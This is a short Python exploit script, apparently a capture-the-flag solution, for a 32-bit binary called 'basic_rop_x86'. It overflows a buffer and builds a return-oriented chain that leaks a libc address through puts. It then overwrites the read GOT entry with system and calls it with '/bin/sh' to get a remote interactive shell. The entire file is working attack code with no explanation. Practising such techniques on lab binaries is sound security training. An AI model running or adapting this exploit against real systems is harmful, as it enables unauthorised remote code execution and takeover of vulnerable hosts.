#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/basic_rop_x86")
libc = pwn.ELF("src/libc.so.6")

POP = 0x0804868b
POP3 = 0x08048689

payload = b"A" * 0x48
payload += pwn.p32(e.plt["puts"])
payload += pwn.p32(POP)
payload += pwn.p32(e.got["read"])
payload += pwn.p32(e.plt["read"])
payload += pwn.p32(POP3)
payload += pwn.p32(0x00)
payload += pwn.p32(e.got["read"])
payload += pwn.p32(0x40)
payload += pwn.p32(e.plt["read"])
payload += pwn.p32(POP)
payload += pwn.p32(e.got["read"] + 0x04)

r.send(payload)
r.recvn(0x40)
read = pwn.u32(r.recvn(4))
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

pwn.success(hex(lb))

payload = pwn.p32(system)
payload += b"/bin/sh\x00"

r.send(payload)

r.interactive()